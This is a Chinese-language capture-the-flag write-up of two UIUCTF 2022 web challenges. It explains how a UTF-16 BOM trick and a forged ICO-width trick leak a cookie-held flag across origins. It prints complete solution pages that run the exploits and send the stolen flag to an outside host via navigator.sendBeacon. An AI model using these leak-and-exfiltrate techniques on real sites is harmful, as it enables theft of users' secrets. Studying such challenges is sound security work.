---
title: uiuctf-2022-writeup
catalog: true
date: 2022-08-01 20:31:10
tags: [Security]
categories: [Security]
---

<img src="/img/uiuctf-ctf-2022-writeup/cover.png" style="display:none">

其實沒有參加這一次的 CTF，但有稍微看到兩題跟 content type 有關的題目覺得有趣，來記一下解法。

<!-- more -->

## modernism(21 solves)

程式碼超簡單：

``` py
from flask import Flask, Response, request
app = Flask(__name__)

@app.route('/')
def index():
    prefix = bytes.fromhex(request.args.get("p", default="", type=str))
    flag = request.cookies.get("FLAG", default="uiuctf{FAKEFLAG}").encode() #^uiuctf{[A-Za-z]+}$
    return Response(prefix+flag, mimetype="text/plain")
```

會把你送去的資料 hex decode 以後加在 response 的 flag 前面，就這樣。有一個 admin bot 會帶著 flag 在 cookie 去造訪你的頁面。

這題我原本想說 `text/plain` 不能被當作 script 載入，就算沒有加 `X-Content-Type-Options: nosniff` 也一樣，後來發現我記錯了，其實是可以的。

相關程式碼在 [third_party/blink/renderer/platform/loader/allowed_by_nosniff.cc](https://source.chromium.org/chromium/chromium/src/+/refs/tags/106.0.5211.0:third_party/blink/renderer/platform/loader/allowed_by_nosniff.cc;l=79;bpv=0;bpt=1)

``` c
// Helper function to decide what to do with with a given mime type. This takes
// - a mime type
// - inputs that affect the decision (is_same_origin, mime_type_check_mode).
//
// The return value determines whether this mime should be allowed or blocked.
// Additionally, warn returns whether we should log a console warning about
// expected future blocking of this resource. 'counter' determines which
// Use counter should be used to count this. 'is_worker_global_scope' is used
// for choosing 'counter' value.
bool AllowMimeTypeAsScript(const String& mime_type,
                           bool same_origin,
                           AllowedByNosniff::MimeTypeCheck mime_type_check_mode,
                           WebFeature& counter) {
  using MimeTypeCheck = AllowedByNosniff::MimeTypeCheck;

  // If strict mime type checking for workers is enabled, we'll treat all
  // "lax" for worker cases as strict.
  if (mime_type_check_mode == MimeTypeCheck::kLaxForWorker &&
      RuntimeEnabledFeatures::StrictMimeTypesForWorkersEnabled()) {
    mime_type_check_mode = MimeTypeCheck::kStrict;
  }

  // The common case: A proper JavaScript MIME type
  if (MIMETypeRegistry::IsSupportedJavaScriptMIMEType(mime_type))
    return true;

  // Check for certain non-executable MIME types.
  // See:
  // https://fetch.spec.whatwg.org/#should-response-to-request-be-blocked-due-to-mime-type?
  if (mime_type.StartsWithIgnoringASCIICase("image/")) {
    counter = WebFeature::kBlockedSniffingImageToScript;
    return false;
  }
  if (mime_type.StartsWithIgnoringASCIICase("audio/")) {
    counter = WebFeature::kBlockedSniffingAudioToScript;
    return false;
  }
  if (mime_type.StartsWithIgnoringASCIICase("video/")) {
    counter = WebFeature::kBlockedSniffingVideoToScript;
    return false;
  }
  if (mime_type.StartsWithIgnoringASCIICase("text/csv")) {
    counter = WebFeature::kBlockedSniffingCSVToScript;
    return false;
  }

  if (mime_type_check_mode == MimeTypeCheck::kStrict) {
    return false;
  }
  DCHECK(mime_type_check_mode == MimeTypeCheck::kLaxForWorker ||
         mime_type_check_mode == MimeTypeCheck::kLaxForElement);

  // Beyond this point we handle legacy MIME types, where it depends whether
  // we still wish to accept them (or log them using UseCounter, or add a
  // deprecation warning to the console).

  if (EqualIgnoringASCIICase(mime_type, "text/javascript1.6") ||
      EqualIgnoringASCIICase(mime_type, "text/javascript1.7")) {
    // We've been excluding these legacy values from UseCounter stats since
    // before.
    return true;
  }

  if (mime_type.StartsWithIgnoringASCIICase("application/octet-stream")) {
    counter = kApplicationOctetStreamFeatures[same_origin];
  } else if (mime_type.StartsWithIgnoringASCIICase("application/xml")) {
    counter = kApplicationXmlFeatures[same_origin];
  } else if (mime_type.StartsWithIgnoringASCIICase("text/html")) {
    counter = kTextHtmlFeatures[same_origin];
  } else if (mime_type.StartsWithIgnoringASCIICase("text/plain")) {
    counter = kTextPlainFeatures[same_origin];
  } else if (mime_type.StartsWithIgnoringCase("text/xml")) {
    counter = kTextXmlFeatures[same_origin];
  } else if (mime_type.StartsWithIgnoringCase("text/json") ||
             mime_type.StartsWithIgnoringCase("application/json")) {
    counter = kJsonFeatures[same_origin];
  } else {
    counter = kUnknownFeatures[same_origin];
  }

  return true;
}
```

可是就算可以被當作是 script 引入，也沒辦法輕易弄成可以執行的語法，因為 flag 中有 `{}`。

非預期解是利用 class，前面加上 class 就變成 `class uiuctf{fakeflag}`，有了這個之後你只要 `uiuctf+''` 就可以得到當初宣告 class 時的那一整串東西，就拿到 flag 了。

預期解是前面加上 BOM，讓 JS 把整個腳本用 UTF-16 去解讀，就會把原本那一串 flag 變成奇怪的中文字，就不會壞了，前面則可以加上 `++window.`，之後去看 window 的每個屬性就好。

作者的[解法](https://codesandbox.io/s/modernism-sol-05tjvc?file=/index.html:0-1544)如下：

``` html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Static Template</title>
  </head>
  <body>
    <!--
      we use a BOM (byte order mark) to change the encoding
      of the document and cause it to be interpreted as valid JS

      BOM = magic unicode character at start of document 
        to indicate encoding and endianness

      chrome supports the UTF16-BE and UTF16-LE BOMs:
      FE FF and FF FE

      we then encode: ++window. as UTF16-BE
      2B2B7769006E0064006F0077002E

      so the JS executed is:
      ++window.RANDOM_UNICODE_CHARACTERS
      
      - luckily, when decoding the flag format as UTF-16 BE, 
        the resultant characters will always be a valid JS identifier
        - this is NOT true in precisionism, due to the space and ! characters in the suffix

      Finally, we iterate through the `window` object,
      and utf16-be encode the added property to get the flag
    -->
    <script src="https://modernism-web.chal.uiuc.tf/?p=FEFF002B002B00770069006E0064006F0077002E"></script>
    <script>
      const encutf16=(s)=>[...s].flatMap(c=>[String.fromCharCode(c.charCodeAt(0)>>8),String.fromCharCode(c.charCodeAt(0)&0xff)]).join('');
      const flag = Object.getOwnPropertyNames(window).map(x=>encutf16(x)).find(x=>x.startsWith('uiuctf{'));
      navigator.sendBeacon("//hc.lc/log2.php?modernism",flag);
    </script>
  </body>
</html>
```


## precisionism(3 solves)

這題跟上題很像，只是結尾多加了一些東西：

``` py
from flask import Flask, Response, request
app = Flask(__name__)

@app.route('/')
def index():
    prefix = bytes.fromhex(request.args.get("p", default="", type=str))
    flag = request.cookies.get("FLAG", default="uiuctf{FAKEFLAG}").encode() #^uiuctf{[0-9A-Za-z]{8}}$
    return Response(prefix+flag+b"Enjoy your flag!", mimetype="text/plain")
```

因為多加的那些東西，所以前面那兩招都不能用。

這題的預期解是把 response 弄成 ICO 格式，然後把要 leak 的部分放到 width 去，就可以 cross origin 拿圖片寬度，一個 byte 一個 byte 拿出來：

作者[解法](https://codesandbox.io/s/precisionism-sol-17tev5?file=/index.html:0-1039)：

``` html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Static Template</title>
  </head>
  <body>
    <h1>
      This is a static template, there is no bundler or bundling involved!
    </h1>
    <script>
      const sleep = () => new Promise((res) => setTimeout(res, 50));
      async function exfil(i) {
        let img = new Image();
        let p = "00000100020001010000010020006804000026000000";
        if (i>0) p = p.slice(0, -i*2);
        img.src = `https://precisionism-web.chal.uiuc.tf/?p=${p}`;
        await img.decode();
        return img.width;
      }
      async function main() {
        for (let i = 0; i < 16; i++) {
          let c = await exfil(i);
          console.log(String.fromCharCode(c));
          navigator.sendBeacon("//hc.lc/log2.php?precisionism",String.fromCharCode(c)+" "+c)
        }
      }
      main();
    </script>
  </body>
</html>
```

## 總結

話說我還有特別研究了一下 chromium 怎麼做 mime sniffing，不過這次題目跟這個好像沒太大關係，還是筆記一下位置：https://source.chromium.org/chromium/chromium/src/+/master:net/base/mime_sniffer.cc